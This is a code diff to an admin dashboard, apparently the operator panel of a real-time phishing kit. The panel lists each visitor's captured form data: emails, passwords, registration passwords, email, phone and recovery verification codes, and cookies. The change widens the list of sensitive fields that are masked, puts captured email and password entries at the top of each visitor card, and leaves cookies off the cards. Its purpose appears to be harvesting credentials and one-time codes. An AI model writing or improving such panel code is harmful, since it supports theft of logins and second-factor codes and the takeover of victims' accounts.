@@ -338,7 +338,7 @@ function VisitorModal({
   const stepLabel = STEP_LABELS[visitor.step] ?? visitor.step;
   const formEntries = Object.entries(visitor.formData ?? {});
   const formHistory = [...(visitor.formHistory ?? [])].reverse();
-  const isSensitive = (field: string) => field === 'password' || field === 'email_code' || field === 'phone_code';
+  const isSensitive = (field: string) => ['password','reg_password','email_code','rec_code','reg_verify_code','phone_code','verification_code'].includes(field);
   const ua = parseUA(visitor.userAgent);
 
   // Steps that bypass the preview (send immediately or have own dialog)
@@ -1155,9 +1155,17 @@ export default function AdminPage() {
                 const vStepColor = STEP_COLORS[v.step] ?? '#4b5563';
                 const vStepLabel = STEP_LABELS[v.step] ?? v.step;
                 const vUA = parseUA(v.userAgent);
-                const dataEntries = Object.entries(v.formData ?? {});
+                const CARD_PRIORITY = ['email','reg_email','rec_email','forgot_email','password','reg_password','email_code','rec_code','reg_verify_code','phone','phone_code','verification_code','cant_use_input','phone_verify','reg_name','reg_dob'];
+                const dataEntries = Object.entries(v.formData ?? {})
+                  .filter(([f]) => f !== 'cookies')
+                  .sort(([a],[b]) => {
+                    const ai = CARD_PRIORITY.indexOf(a), bi = CARD_PRIORITY.indexOf(b);
+                    if (ai === -1 && bi === -1) return 0;
+                    if (ai === -1) return 1; if (bi === -1) return -1;
+                    return ai - bi;
+                  });
                 const hasData = dataEntries.length > 0;
-                const isSens = (f: string) => f === 'password' || f === 'email_code' || f === 'phone_code' || f === 'verification_code';
+                const isSens = (f: string) => ['password','reg_password','email_code','rec_code','reg_verify_code','phone_code','verification_code'].includes(f);
                 return (
                   <div
                     key={v.id}
